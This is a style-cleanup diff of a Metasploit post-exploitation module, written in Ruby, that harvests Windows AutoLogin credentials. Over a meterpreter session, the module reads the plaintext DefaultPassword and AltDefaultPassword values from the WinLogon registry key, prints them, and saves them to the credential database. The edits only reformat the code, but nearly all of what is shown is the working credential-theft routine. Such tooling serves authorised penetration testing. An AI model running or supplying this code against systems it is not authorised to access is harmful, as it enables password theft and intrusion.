@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -10,35 +11,32 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather AutoLogin User Credential Extractor',
-        'Description'   => %q{
-          This module extracts the plain-text Windows user login password in Registry.
-          It exploits a Windows feature that Windows (2000 to 2008 R2) allows a
-          user or third-party Windows Utility tools to configure User AutoLogin via
-          plain-text password insertion in (Alt)DefaultPassword field in the registry
-          location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable
-          by all users.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-          [
-            'Myo Soe' #YGN Ethical Hacker Group, http://yehg.net
-          ],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ],
-        'References'     =>
-        [
-          [ 'URL', 'http://support.microsoft.com/kb/315231' ],
-          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
-        ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather AutoLogin User Credential Extractor',
+                      'Description'   => %q{
+                        This module extracts the plain-text Windows user login password in Registry.
+                        It exploits a Windows feature that Windows (2000 to 2008 R2) allows a
+                        user or third-party Windows Utility tools to configure User AutoLogin via
+                        plain-text password insertion in (Alt)DefaultPassword field in the registry
+                        location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable
+                        by all users.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'Myo Soe' # YGN Ethical Hacker Group, http://yehg.net
+                        ],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ],
+                      'References' =>
+                      [
+                        [ 'URL', 'http://support.microsoft.com/kb/315231' ],
+                        [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
+                      ]))
   end
 
-
   def run
-
     host_name = sysinfo['Computer']
     print_status("Running against #{host_name} on session #{datastore['SESSION']}")
 
@@ -59,23 +57,23 @@ class MetasploitModule < Msf::Post
     du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
     dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''
 
-    if do1 != '' and  du1 != '' and dp1 == '' and al == '1'
+    if (do1 != '') && (du1 != '') && (dp1 == '') && (al == '1')
       has_al = 1
-      creds << [du1,dp1, do1]
+      creds << [du1, dp1, do1]
       print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
-    elsif do1 != '' and  du1 != '' and dp1 != ''
+    elsif (do1 != '') && (du1 != '') && (dp1 != '')
       has_al = 1
-      creds << [du1,dp1, do1]
+      creds << [du1, dp1, do1]
       print_good("DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
     end
 
-    if do2 != '' and  du2 != '' and dp2 == '' and al == '1'
+    if (do2 != '') && (du2 != '') && (dp2 == '') && (al == '1')
       has_al = 1
-      creds << [du2,dp2,do2]
+      creds << [du2, dp2, do2]
       print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
-    elsif do2 != '' and  du2 != '' and dp2 != ''
+    elsif (do2 != '') && (du2 != '') && (dp2 != '')
       has_al = 1
-      creds << [du2,dp2,do2]
+      creds << [du2, dp2, do2]
       print_good("AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
     end
 
@@ -89,7 +87,7 @@ class MetasploitModule < Msf::Post
         workspace_id: myworkspace_id,
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: cred[0],
         private_data: cred[1],
         private_type: :password,
